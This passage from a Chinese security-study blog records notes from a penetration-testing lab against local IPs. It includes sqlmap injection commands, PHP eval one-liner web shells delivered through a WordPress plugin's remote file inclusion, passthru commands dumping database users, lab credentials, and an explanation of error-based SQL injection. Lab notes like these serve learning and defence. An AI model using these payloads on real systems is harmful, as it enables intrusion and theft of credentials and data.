          <li>admin:admin123</li>
          <li>sqlmap -u ‘http://192.168.10.100/index.php/weblinks-categories?id=0<em>’ –level=3 –dbs 把注入的语句用</em>代替，使用*告知sqlmap在这里注入成功率较高
            <ul>
              <li>sqlmap：相比level1，level3是尝试更多的注入</li>
              <li>sqlmap -u ‘http://192.168.10.100/index.php/weblinks-categories?id=0*’ –level=3 –dbs</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <p>wordpress</p>

    <ul>
      <li>Kali:wpscan
        <ul>
          <li>主要使用plugin和数据库相关指令</li>
          <li>wpscan -u http://192.168.10.116/wordpress –enumerate p</li>
          <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;php @eval($_POST[‘cmd’]);//	wordpress一句话木马</li>
          <li>绕过方法：<strong>RFI to get shell</strong>
            <ul>
              <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_POST[‘cmd’]);?&gt;</li>
              <li>data:text/plain,&lt;?php @eval($_POST[‘cmd’]);?&gt;</li>
              <li>data:text/plain,&lt;?php @eval($_POST[‘cmd’]);//</li>
              <li>发现可以执行phpinfo指令，192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‘cmd’]);?&gt;&amp;cmd=phpinfo();</li>
              <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‘cmd’]);?&gt;&amp;cmd=passthru(‘mysql -u wordpress -pwp_pass888 -A wordpress -e “show tables;”’);</li>
              <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‘cmd’]);?&gt;&amp;cmd=passthru(‘mysql -u wordpress -pwp_pass888 -A wordpress -e “select * from wp_users;”’);</li>
              <li>passthru执行系统命令并且回显：-p后面不能有空格，要直接连接密码；单双引号使用分开，否则会不正常闭合</li>
            </ul>
          </li>
          <li>sqli to get shell
            <ul>
              <li>admin:wp_@dm!n</li>
            </ul>
          </li>
          <li>插件实现WordPress渗透：jetpack</li>
          <li>上传插件时加入一句话木马</li>
          <li>上传路径在/wordpress/wp-content/plugins/akismet,在该路径下实现了渗透</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<h3 id="问题">问题</h3>
<ol>
  <li>SQL注入时<code class="language-plaintext highlighter-rouge">select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code>
实际情况如下面的例子<code class="language-plaintext highlighter-rouge">select count(*) from TSafe group by floor(rand(0)*2);</code>
    <ul>
      <li>表中必须有3条以上的记录才会报错</li>
      <li>rand()函数的随机因子若不取，则会随机报错，设为固定值如rand(0)，如表中有3条以上数据，就一定报错。</li>
      <li>原理：
        <ul>
          <li>执行该条语句时，先建立虚表</li>
          <li>floor(rand(0)*2)的返回值是011011…且查询时rand()会被反复执行，即在查询过程中每次匹配会重新计算rand()的值</li>
          <li>011011..第一次查询0，没有重新计算为1，产生第一条数据；第二次查询1，有count则直接加1为2；第三次查询0没有重新计算为1，此时有1但是仍要插入1，重复报错。</li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong><em>[关键]</em></strong>在使用虚拟机的时候会遇到内存不足的情况，直接修改Vmware里的硬盘大小会导致虚拟机重启后无法开机。<a href="https://codesilence.wordpress.com/2013/03/14/live-resizing-of-an-ext4-filesytem-on-linux/">解决办法</a>是需要重新划分硬盘和设置交换区，使用<code class="language-plaintext highlighter-rouge">fdisk</code>和<code class="language-plaintext highlighter-rouge">mkswap</code>等工具实现。</li>
</ol>

  </section>
<!-- <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script> -->
</article>

<section>
       <ul class="pager">
        
        <li class="previous">
            <a href="/2017/11/MongoDB/" data-toggle="tooltip" data-placement="top" title="MongoDB自学笔记">Last Blog：  <span>MongoDB自学笔记</span>
            </a>
        </li>
        
        
        <li class="next">
            <a href="/2017/11/emacs%E6%80%BB%E7%BB%93/" data-toggle="tooltip" data-placement="top" title="emacs总结">Next Blog：  <span>emacs总结</span>
            </a>
        </li>
        
    </ul>
</section>

<section class="post-comments">
<div id="disqus_thread"></div>
  <script type="text/javascript">
    var disqus_config = function () {
      // Here is an example,
      this.page.url = "https://c0ldstudy.github.io/2017/11/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/";
      this.page.identifier = "/2017/11/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/";
    };

    // You should be able to get the following lines of code from your Disqus admin.
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = '//c0ldstudy-github-io.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>
    Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
  </noscript>
</section>


            <section class="footer">
    <footer>
        <div class = "footer_div">
          <div clas="recordings" style="display:flex;justify-content:space-around;">
          <div class="twitter_display">
            <div class='jekyll-twitter-plugin'><a class="twitter-timeline" data-width="300" data-tweet-limit="1" href="https://twitter.com/JiacenXu?ref_src=twsrc%5Etfw">Tweets by JiacenXu</a>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</div>
          </div>
          <div class="github_chart">
            <img src="http://ghchart.rshah.org/409ba5/C0ldstudy" alt="C0ldstudy's Blue Github chart"/>
            <script type='text/javascript' id='clustrmaps' src='//cdn.clustrmaps.com/map_v2.js?cl=ffffff&w=400&t=n&d=PWaejm3rz2TG6HOtwcekX2kM9kPWz2aP6GYhuOVoNpA&co=2d78ad&cmo=3acc3a&cmn=ff5353&ct=ffffff'></script>
          </div>
        </div>
            <nav class="cover-navigation navigation--social">
            <ul class="navigation">
          
          <!-- Github -->
          <li class="navigation__item_social">
            <a href="https://github.com/c0ldstudy" title="@c0ldstudy 的 Github" target="_blank">
              <i class='fab fa-github fa-2x'></i>
              <span class="label">Github</span>
            </a>
          </li>
          
          
          <!-- Twitter -->
          <li class="navigation__item_social">
            <a href="https://twitter.com/JiacenXu" title="@JiacenXu" target="_blank">
              <i class='fab fa-twitter fa-2x'></i>
              <span class="label">Twitter</span>
            </a>
          </li>
          

          
          <!-- LinkedIn -->
          <li class="navigation__item_social">
            <a href="https://www.linkedin.com/in/jiacen-xu-021536105/" title="@jiacen-xu-021536105" target="_blank">
              <i class='fab fa-linkedin fa-2x'></i>
              <span class="label">LinkedIn</span>
            </a>
          </li>
          
          

          <!-- RSS -->
          <li class="navigation__item_social">
            <a href="/feed.xml" rel="author" title="RSS" target="_blank">
              <i class='fa fa-rss fa-2x'></i>
              <span class="label">RSS</span>
            </a>
          </li>

          
          <!-- Email -->
          <li class="navigation__item_social">
            <a href="mailto:coldstudyxu@gmail.com" title="Contact me">
              <i class='fa fa-envelope fa-2x'></i>
              <span class="label">Email</span>
            </a>
          </li>
          
          </ul>
        </nav>
        </div>

        <div class = "footer_div_counter">
           <p class="copyright text-muted">
            Copyright &copy; Jason Xu 2022 Theme by <a href="http://c0ldstudy.github.io/">C0ldstudy</a> |
            <iframe
                style="margin-left: 2px; margin-bottom:-5px;"
                frameborder="0" scrolling="0" width="91px" height="20px"
                src="https://ghbtns.com/github-btn.html?user=c0ldstudy&repo=c0ldstudy.github.io&type=star&count=true" >
            </iframe>
            </p>
        	<div align="right">
    			<!-- <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css"> -->
          <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

          <!-- 访问统计 -->
          <span id="busuanzi_container_site_uv" style='display:none'>
          <span id="busuanzi_value_site_uv"></span> People Visited!
          </span>
        </div>
        </div>
    </footer>
</section>

        </div>
    </div>

    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="/js/main.js"></script>

<script type="text/javascript" src="/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>




  </body>

</html>
